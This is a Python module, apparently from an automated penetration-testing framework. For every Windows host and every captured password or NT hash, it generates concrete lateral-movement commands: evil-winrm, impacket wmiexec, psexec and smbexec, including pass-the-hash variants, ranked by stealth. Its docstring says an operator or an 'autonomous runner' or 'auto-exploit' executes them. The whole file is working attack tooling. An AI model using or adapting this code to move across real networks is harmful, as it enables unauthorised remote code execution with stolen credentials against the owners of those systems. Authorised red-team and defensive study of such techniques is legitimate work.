"""Generalized Windows lateral-movement chains.

Given a set of Windows hosts + one or more credentials (or hashes), emit the
concrete lateral commands the operator (or an outer autonomous runner) can try,
in decreasing quietness order:

    winrm (evil-winrm) -> wmiexec -> psexec -> smbexec

Also pass-the-hash variants of each when we hold an NT hash instead of a
plaintext. Everything argv-generated; no shell metachars beyond curl-style
quoting. Same posture as `pivot`/`adchain`: the library names the moves, the
operator (or auto-exploit) fires them.
"""

from __future__ import annotations

from ..core.state import Credential, EngagementState


def evilwinrm_argv(host: str, user: str, secret: str, *, is_hash: bool = False) -> list[str]:
    flag = "-H" if is_hash else "-p"
    return ["evil-winrm", "-i", host, "-u", user, flag, secret]


def wmiexec_argv(host: str, user: str, secret: str, *, domain: str = "",
                 is_hash: bool = False) -> list[str]:
    id_str = f"{domain}/{user}" if domain else user
    if is_hash:
        return ["impacket-wmiexec", "-hashes", f":{secret}", f"{id_str}@{host}"]
    return ["impacket-wmiexec", f"{id_str}:{secret}@{host}"]


def psexec_argv(host: str, user: str, secret: str, *, domain: str = "",
                is_hash: bool = False) -> list[str]:
    id_str = f"{domain}/{user}" if domain else user
    if is_hash:
        return ["impacket-psexec", "-hashes", f":{secret}", f"{id_str}@{host}"]
    return ["impacket-psexec", f"{id_str}:{secret}@{host}"]


def smbexec_argv(host: str, user: str, secret: str, *, domain: str = "",
                 is_hash: bool = False) -> list[str]:
    id_str = f"{domain}/{user}" if domain else user
    if is_hash:
        return ["impacket-smbexec", "-hashes", f":{secret}", f"{id_str}@{host}"]
    return ["impacket-smbexec", f"{id_str}:{secret}@{host}"]


def lateral_commands(state: EngagementState) -> list[tuple[str, str, list[str]]]:
    """(host, technique, argv) rungs for every Windows host x usable credential.

    "Usable" = a password credential we hold OR an NT hash (kind='hash' whose
    secret looks like a 32-hex NT hash). Non-Windows hosts are skipped. Order
    per host: winrm -> wmi -> psexec -> smbexec.
    """
    out: list[tuple[str, str, list[str]]] = []
    for host in state.hosts.values():
        if not _looks_windows(host):
            continue
        domain = next((t.split(":", 1)[1] for t in host.tags
                       if t.startswith("domain:")), "")
        for cred in _usable_creds(state):
            secret = cred.secret or ""
            is_hash = _looks_nt_hash(secret) and cred.kind == "hash"
            user = cred.username or ""
            if not user or not secret:
                continue
            base = f"{user}@{host.address}"
            out.append((host.address, f"winrm-{'pth' if is_hash else 'pw'} ({base})",
                        evilwinrm_argv(host.address, user, secret, is_hash=is_hash)))
            out.append((host.address, f"wmi-{'pth' if is_hash else 'pw'} ({base})",
                        wmiexec_argv(host.address, user, secret,
                                     domain=domain, is_hash=is_hash)))
            out.append((host.address, f"psexec-{'pth' if is_hash else 'pw'} ({base})",
                        psexec_argv(host.address, user, secret,
                                    domain=domain, is_hash=is_hash)))
            out.append((host.address, f"smbexec-{'pth' if is_hash else 'pw'} ({base})",
                        smbexec_argv(host.address, user, secret,
                                     domain=domain, is_hash=is_hash)))
    return out


def _looks_windows(host) -> bool:
    hay = " ".join([host.os_guess or "", *host.tags,
                    *(s.name or "" for s in host.services.values()),
                    *(s.product or "" for s in host.services.values())]).lower()
    return ("windows" in hay or "smb" in hay or "microsoft" in hay
            or "netbios" in hay or "dc" in host.tags)


def _usable_creds(state: EngagementState) -> list[Credential]:
    out: list[Credential] = []
    for c in state.credentials:
        if not c.username or not c.secret:
            continue
        if c.kind == "password":
            out.append(c)
        elif c.kind == "hash" and _looks_nt_hash(c.secret):
            out.append(c)
    return out


def _looks_nt_hash(s: str) -> bool:
    return bool(s) and len(s) == 32 and all(ch in "0123456789abcdefABCDEF" for ch in s)
